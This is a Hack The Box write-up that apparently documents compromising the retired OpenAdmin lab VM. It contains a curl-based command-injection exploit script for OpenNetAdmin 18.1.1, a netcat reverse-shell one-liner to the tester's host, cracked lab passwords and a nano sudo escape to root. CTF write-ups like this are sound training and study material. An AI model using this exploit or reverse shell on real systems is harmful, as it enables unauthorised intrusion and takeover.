---
layout: post
title: "OpenAdmin: Hack The Box Walkthrough"
date: 2020-05-02 15:32:55 +0000
last_modified_at: 2020-05-02 15:32:55 +0000
category: Walkthrough
tags: ["Hack The Box", OpenAdmin, retired, Linux, Easy]
comments: true
image:
  feature: openadmin-htb-walkthrough.png
---

This post documents the complete walkthrough of OpenAdmin, a retired vulnerable [VM][1] created by [dmw0ng][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

OpenAdmin is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.171 --rate=700

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-07 01:55:18 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.171
Discovered open port 22/tcp on 10.10.10.171
```

Nothing extraordinary. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.171
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
```

Whoa! This is a shit-show man. In any case, this is what the site looks like.

{% include image.html image_alt="775f14ec.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/775f14ec.png" %}

You can't get more default than this :laughing:

### Directory/File Enumeration

Let's switch gear and see what we can discover from fuzzing the site with `wfuzz`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 64 --hc 404 http://10.10.10.171/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.171/FUZZ
Total requests: 4644

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================

000669:  C=301      9 L       28 W          314 Ch        "artwork"
002145:  C=200    375 L      964 W        10918 Ch        "index.html"
002715:  C=301      9 L       28 W          312 Ch        "music"
003648:  C=403      9 L       28 W          277 Ch        "server-status"
000011:  C=403      9 L       28 W          277 Ch        ".htaccess"
000012:  C=403      9 L       28 W          277 Ch        ".htpasswd"
000010:  C=403      9 L       28 W          277 Ch        ".hta"

Total time: 26.21841
Processed Requests: 4644
Filtered Requests: 4637
Requests/sec.: 177.1274
```

Interesting. It appears that we have two directories: artwork and music. This is how they look like.

_`/artwork`_

{% include image.html image_alt="7eae3f90.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/7eae3f90.png" %}

_`/music`_

{% include image.html image_alt="349f6169.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/349f6169.png" %}

They are both apparently very good-looking templates but only one of them offers the path forward. If you look at `/music`, there's a hyperlink to `/ona`, which stands for OpenNetAdmin.


### OpenNetAdmin 18.1.1 - Remote Code Execution

This is how it looks like.

{% include image.html image_alt="8cae4dae.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/8cae4dae.png" %}

I think we have the exploit we need in EDB-ID [47691](https://www.exploit-db.com/exploits/47691). After understanding what the exploit does, I modified it a little to suit my needs.

<div class="filename"><span>cmd.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.171
CMD=$(urlencode $1)

curl -i \
     -s \
     -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";$CMD;echo \"END\"&xajaxargs[]=ping" \
     $HOST/ona/ \
| sed '/BEGIN/,/END/!d' \
| sed -r -e '1d' -e '$d'
```

Let's give it a shot.

{% include image.html image_alt="d65b807d.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/d65b807d.png" %}

Awesome.

## Low-Privilege Shell

With that, it's pretty trivial to get a reverse shell albeit a low-privileged one. On one hand, send a reverse shell back to myself, and on the other hand set up a listener to receive the reverse shell, you know, the standard stuff.

```
# ./cmd.sh "rm -rf /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.15.195 1234 >/tmp/p"
```

{% include image.html image_alt="e7783893.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/e7783893.png" %}

Bam. There you have it.

### Getting `user.txt`

During enumeration of `www-data`\'s account, I notice that there are two accounts in the same group: `jimmy` (1000) and `joanna` (1001).

{% include image.html image_alt="2ea45d44.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/2ea45d44.png" %}

They are both are in the `internal` group.

{% include image.html image_alt="6fd57427.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/6fd57427.png" %}

A simple `find` for resources associated with the `internal` group reveals the following.

{% include image.html image_alt="e549155c.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/e549155c.png" %}

Further digging into virtual hosts configuration reveals the following.

{% include image.html image_alt="a18a13ba.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/a18a13ba.png" %}

Well, I know what to do but in any case, I'll still need to log in to `jimmy`'s account first.

#### OpenNetAdmin's Database Configuration

I chanced upon ONA's database configuration while I was exploring the `/opt/ona/www` directory.

{% include image.html image_alt="06c6a6fe.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/06c6a6fe.png" %}

Hmm. The password `n1nj4W4rri0R!` piques my curiosity. Maybe it\'s the password to one of the accounts? There\'s only one way to find out.

#### Logging in as `jimmy`

Indeed. It\'s `jimmy`\'s password.

{% include image.html image_alt="504c1d7c.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/504c1d7c.png" %}

Now, we can navigate to `/var/www/internal` to look at its contents.

{% include image.html image_alt="7c6517fb.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/7c6517fb.png" %}

There's something interesting in `index.php`.

~~~php
if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302...0523b1') {
  $_SESSION['username'] = 'jimmy';
  header("Location: /main.php");
} else {
  $msg = 'Wrong username or password.';
}  
~~~

In order to **"log in"**, the SHA512 hash of the password must match `00e302...0523b1`. Using an online [cracker](https://crackstation.net/), the password was revealed to be, are you ready? `Revealed` :stuck_out_tongue:

Well, in any case, I could have edited `index.php` to have any password I like without resorting to password cracking.

#### SSH Local Port Forwarding

Since I have access to `jimmy`'s account, I can dump a SSH public key I control into `/home/jimmy/.ssh/authorized_keys` in order to forward my local port to the remote port 52846. Assuming I have done that, here's the command to create the SSH tunnel to access `internal.openadmin.htb:52846`:

```
ssh -L 52846:127.0.0.1:52846 -i jimmy jimmy@10.10.10.171
```

Once that's done, I should have a local port listening at `52846/tcp`.

{% include image.html image_alt="cb2ea8c2.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/cb2ea8c2.png" %}

#### Accessing `joanna`'s SSH private key

Suffice to say, I added `internal.openadmin.htb` to `/etc/hosts` mapping it to `127.0.0.1`.

{% include image.html image_alt="01fc96b2.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/01fc96b2.png" %}

After logging in, `joanna`'s SSH password-protected private key is revealed along with a hint what the password might be.

{% include image.html image_alt="73bbc349.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/73bbc349.png" %}

#### John the Ripper

Enter JtR.

{% include image.html image_alt="8fa14feb.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/8fa14feb.png" %}

The password to unlock `joanna`'s private key is `bloodninjas`. With that, we can finally log in to `joanna`'s account and retrieve `user.txt`.

{% include image.html image_alt="3eb09f1d.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/3eb09f1d.png" %}

## Privilege Escalation

During enumeration of `joanna`'s account, I notice that `joanna` is able to `sudo` `nano` to open `/opt/priv`.

{% include image.html image_alt="a3b414ee.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/a3b414ee.png" %}

### GTFOBins

This is a classic [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) attack. Following the instruction, I was able to break out of `nano` to get myself a `root` shell.

```
nano
^R^X
reset; sh 1>&0 2>&0
```

Armed with a `root` shell, getting `root.txt` is trivial.

{% include image.html image_alt="61563036.png" image_src="/assets/images/posts/openadmin-htb-walkthrough/61563036.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/222
[2]: https://www.hackthebox.eu/home/users/profile/82600
[3]: https://www.hackthebox.eu/
